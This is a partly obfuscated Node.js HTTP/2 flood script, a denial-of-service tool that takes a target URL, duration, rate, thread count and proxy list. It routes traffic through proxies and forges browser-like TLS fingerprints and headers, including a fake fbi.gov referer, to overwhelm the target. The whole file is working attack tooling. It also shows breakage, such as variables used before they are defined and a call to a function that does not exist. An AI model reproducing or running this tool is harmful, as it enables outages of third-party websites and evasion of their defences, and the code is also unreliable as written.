(function () {
}());
const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
setInterval(function () {
    _0x373b87();
}, 4000);
const url = require('url');
const crypto = require('crypto');
const fs = require('fs');
const {HeaderGenerator} = require('header-generator');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (_0x403857) {
});
if (process.argv.length < 7) {
    console.log('Usage: target time rate thread proxyfile');
    process.exit();
}
const headers = {
    ':method': 'GET',
    ':authority': parsedTarget.host,
    ':scheme': 'https',
    ':path': parsedTarget.path + '?' + randstr(5) + '=' + randstr(15),
    'accept-encoding': encoding,
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': 'Windows',
    'upgrade-insecure-requests': '1',
    'user-agent': uap1,
    accept: accept,
    'accept-language': lang,
    referer: Ref,
    'sec-fetch-dest': 'document',
    'sec-fetch-site': randomHeaders['sec-fetch-site'],
    'sec-fetch-mode': 'navigate',
    TE: 'trailers',
    'sec-fetch-user': '?1',
    DNT: '1',
    'X-Requested-With': 'XMLHttpRequest'
};
function readLines(_0x25c5cd) {
    return fs.readFileSync(_0x25c5cd, 'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x1cd52d, _0x493c72) {
    return Math.floor(Math.random() * (_0x493c72 - _0x1cd52d) + _0x1cd52d);
}
function randomElement(_0x39d0e2) {
    return _0x39d0e2[randomIntn(0, _0x39d0e2.length)];
}
function randstr(_0x1f6712) {
    const _0x3871e9 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let _0x4064b5 = '';
    const _0x14a9ca = _0x3871e9.length;
    for (let _0x53c731 = 0; _0x53c731 < _0x1f6712; _0x53c731++) {
        _0x4064b5 += _0x3871e9.charAt(Math.floor(Math.random() * _0x14a9ca));
    }
    return _0x4064b5;
}
const ip_spoof = () => {
    const _0x16761b = () => {
        return Math.floor(Math.random() * 255);
    };
    return _0x16761b() + '.' + _0x16761b() + '.' + _0x16761b() + '.' + _0x16761b();
};
const spoofed = ip_spoof();
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};
const _0x1c9f9a = {
    name: 'firefox',
    minVersion: 112,
    httpVersion: '2'
};
const _0x273600 = {
    name: 'chrome',
    minVersion: 112,
    httpVersion: '2'
};
const _0x25e998 = {
    browsers: [
        _0x1c9f9a,
        _0x273600
    ],
    devices: [
        'mobile',
        'desktop'
    ],
    operatingSystems: [
        'linux',
        'windows',
        'macos'
    ]
};
let headerGenerator = new HeaderGenerator(_0x25e998);
let randomHeaders = headerGenerator.getHeaders();
const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha512'
];
const sigalgs1 = sig.join(':');
const cplist = [
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES'
];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];
lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    ' en-GB,en;q=0.7',
    '*',
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5',
    'da, en-gb;q=0.8, en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'tr',
    'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
];
const encoding_header = [
    '*',
    '*/*',
    'gzip',
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    'gzip, deflate',
    'br',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip;q=1.0, identity; q=0.5, *;q=0',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    'compress;q=0.5, gzip;q=1.0',
    'identity',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'deflate'
];
const control_header = [
    'max-age=604800',
    'proxy-revalidate',
    'public, max-age=0',
    'max-age=315360000',
    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    's-maxage=604800',
    'max-stale',
    'public, immutable, max-age=31536000',
    'must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'max-age=31536000,public,immutable',
    'max-age=31536000,public',
    'min-fresh',
    'private',
    'public',
    's-maxage',
    'no-cache',
    'no-cache, no-transform',
    'max-age=2592000',
    'no-store',
    'no-transform',
    'max-age=31557600',
    'stale-if-error',
    'only-if-cached',
    'max-age=0'
];
const refers = ['https://fbi.gov/'];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers1 = 'GREASE:' + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(':');
const uap = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.1134 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5563 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.6434 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.8372 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5767 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.9821 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.542.0.234 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.8364 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.6133 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5237 Safari/537.36'
];
platform = [
    'Linux',
    'macOS',
    'Windows'
];
version = [
    '"Chromium";v="100", "Google Chrome";v="100"',
    '"(Not(A:Brand";v="8", "Chromium";v="98"',
    '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
    '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
    '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
    '" Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"'
];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}
class NetSocket {
    constructor() {
    }
    HTTP(_0xa4066e, _0x51e82e) {
        const _0x304c8e = _0xa4066e.address.split(':');
        const _0x240eab = _0x304c8e[0];
        const _0xab0446 = 'CONNECT ' + _0xa4066e.address + ':443 HTTP/1.1\r\nHost: ' + _0xa4066e.address + ':443\r\nConnection: Keep-Alive\r\n\r\n';
        const _0x2c2f4a = new Buffer.from(_0xab0446);
        const _0x36281c = {
            host: _0xa4066e.host,
            port: _0xa4066e.port
        };
        const _0x36b46e = net.connect(_0x36281c);
        _0x36b46e.setTimeout(_0xa4066e.timeout * 600000);
        _0x36b46e.setKeepAlive(true, 100000);
        _0x36b46e.on('connect', () => {
            _0x36b46e.write(_0x2c2f4a);
        });
        _0x36b46e.on('data', _0x1a22dc => {
            const _0x5ae26b = _0x1a22dc.toString('utf-8');
            const _0x107e65 = _0x5ae26b.includes('HTTP/1.1 200');
            if (_0x107e65 === false) {
                _0x36b46e.destroy();
                return _0x51e82e(undefined, 'error: invalid response from proxy server');
            }
            return _0x51e82e(_0x36b46e, undefined);
        });
        _0x36b46e.on('timeout', () => {
            _0x36b46e.destroy();
            return _0x51e82e(undefined, 'error: timeout exceeded');
        });
        _0x36b46e.on('error', _0x274c94 => {
            _0x36b46e.destroy();
            return _0x51e82e(undefined, 'error: ' + _0x274c94);
        });
    }
}
const Socker = new NetSocket();
function runFlooder() {
    const _0x39f5f8 = randomElement(proxies);
    const _0x4f8a6a = _0x39f5f8.split(':');
    const _0x16ac10 = {
        host: _0x4f8a6a[0],
        port: ~~_0x4f8a6a[1],
        address: parsedTarget.host + ':443',
        timeout: 100
    };
    Socker.HTTP(_0x16ac10, (_0x4a7207, _0x31a689) => {
        if (_0x31a689) {
            return;
        }
        _0x4a7207.setKeepAlive(true, 600000);
        const _0x387de2 = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: _0x4a7207,
            ecdhCurve: 'prime256v1:X25519',
            ciphers: tls.getCiphers().join(':') + cipper,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: 'TLS_method'
        };
        _0x387de2.host = parsedTarget.host;
        const _0x210e8a = tls.connect(443, parsedTarget.host, _0x387de2);
        _0x210e8a.setKeepAlive(true, 60000);
        const _0x3913b2 = {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        };
        const _0x215bc0 = {
            protocol: 'https:',
            settings: _0x3913b2,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => _0x210e8a,
            socket: _0x4a7207
        };
        const _0x427280 = http2.connect(parsedTarget.href, _0x215bc0);
        const _0x2ae65f = {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        };
        _0x427280.settings(_0x2ae65f);
        _0x427280.on('connect', () => {
            const _0x22354b = setInterval(() => {
                for (let _0x385af6 = 0; _0x385af6 < args.Rate; _0x385af6++) {
                    const _0x25db69 = _0x427280.request(headers).on('response', _0x5998a3 => {
                        _0x25db69.close();
                        _0x25db69.destroy();
                        return;
                    });
                    _0x25db69.end();
                }
            }, 500);
        });
        _0x427280.on('close', () => {
            _0x427280.destroy();
            _0x4a7207.destroy();
            return;
        });
    });
    (function (_0x3378fa, _0x2c8848, _0xfd29a0) {
    });
}
const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);